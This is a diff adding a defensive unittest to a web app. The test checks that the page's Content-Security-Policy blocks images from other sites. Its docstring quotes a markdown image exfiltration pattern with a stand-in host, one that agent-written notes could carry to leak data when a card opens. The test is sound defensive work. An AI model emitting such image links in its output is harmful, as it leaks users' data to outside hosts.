@@ -314,6 +314,14 @@ class ApiTests(unittest.TestCase):
         js = r.text.split('assets/')[1].split('"')[0]
         self.assertEqual(c.get(f'/assets/{js}').status_code, 200)
 
+    def test_the_page_loads_no_picture_from_another_site(self):
+        """Agent notes, reports and chat render as markdown, and `![](https://x.example/?d=<data>)` in
+        any of them was a request carrying that data out the moment the owner opened the card. No
+        default-src: scripts, styles and fonts keep loading as they did; only pictures are pinned."""
+        csp = c.get('/').headers.get('content-security-policy', '')
+        self.assertIn("img-src 'self' data: blob:", csp)
+        self.assertNotIn('default-src', csp)
+
     def test_failed_triage_can_retry_once_without_duplicate_tasks(self):
         mid = server.store.add_message({'ExternalId': 'retry-triage-unique-93f2', 'Channel': 'email',
                                         'ConversationId': 'retry-triage-conversation-93f2',
